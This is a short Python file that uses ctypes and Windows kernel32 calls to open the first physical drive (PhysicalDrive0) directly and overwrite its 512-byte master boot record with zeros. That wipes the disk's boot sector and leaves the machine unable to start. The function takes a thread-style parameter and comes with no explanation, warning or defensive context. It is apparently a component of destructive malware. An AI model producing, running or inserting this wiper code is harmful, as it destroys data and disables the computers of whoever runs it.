import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

GENERIC_ALL = 0x10000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

MasterBootRecord = bytes(512)

CreateFileA = kernel32.CreateFileA
CreateFileA.argtypes = [wintypes.LPCSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
CreateFileA.restype = wintypes.HANDLE

WriteFile = kernel32.WriteFile
WriteFile.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
WriteFile.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

def mbr(lpParam):
    hFile = CreateFileA(b"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None)
    if hFile != INVALID_HANDLE_VALUE:
        BytesWritten = wintypes.DWORD(0)
        WriteFile(hFile, MasterBootRecord, 512, ctypes.byref(BytesWritten), None)
        CloseHandle(hFile)
    return 0
